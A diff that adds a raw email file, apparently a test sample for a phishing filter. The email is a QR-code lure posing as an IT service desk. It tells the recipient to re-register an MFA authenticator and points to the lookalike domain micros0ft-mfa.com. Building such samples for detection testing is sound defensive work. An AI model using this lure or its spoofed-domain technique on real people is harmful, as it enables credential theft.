@@ -1,0 +1,12 @@
+From: "IT Service Desk" <support@it-cloud-desk.org>
+To: victim@company.com
+Subject: Mandatory 2FA Device Migration: Scan QR Code with Mobile Phone
+Return-Path: <support@it-cloud-desk.org>
+Reply-To: <support@it-cloud-desk.org>
+Date: Fri, 16 Oct 2026 15:30:00 +0000
+Message-ID: <test-05-2026@mail-gateway.org>
+Authentication-Results: mx.company.com; spf=none dkim=none dmarc=none
+MIME-Version: 1.0
+Content-Type: text/html; charset=utf-8
+
+<html><body><p>All enterprise employees must re-register their mobile authenticator.</p><p>Scan the QR code below using your smartphone camera:</p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNk+M9QDwADhgGAWjR9awAAAABJRU5ErkJggg==" alt="MFA QR Code"><p>Encoded Destination: https://login.micros0ft-mfa.com/enroll</p></body></html>
